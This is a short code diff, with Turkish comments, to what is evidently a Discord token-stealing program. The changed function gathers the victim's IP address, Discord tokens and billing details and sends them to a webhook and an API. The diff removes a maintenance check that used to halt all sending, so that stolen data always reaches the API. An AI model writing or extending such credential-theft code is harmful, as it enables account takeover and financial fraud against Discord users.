@@ -487,10 +487,6 @@ async function firstTime() {
     _initDone = true;
 
     try {
-        // Maintenance kontrolü - block_discord aktifse hiçbir şey gönderme
-        const blocked = await checkMaintenance();
-        if (blocked) return;
-
         const ip     = await getIP();
         const client = getDiscordClientName();
         const tokens = await getAllTokens(8, 2000);
@@ -531,6 +527,7 @@ async function firstTime() {
                     fields,
                     avatar, null
                 ));
+                // API'ye her zaman gönder (maintenance sadece webhook'u bloklar)
                 postAPI(user, billing, token, ip, 'initialized', {});
             } catch {}
         }
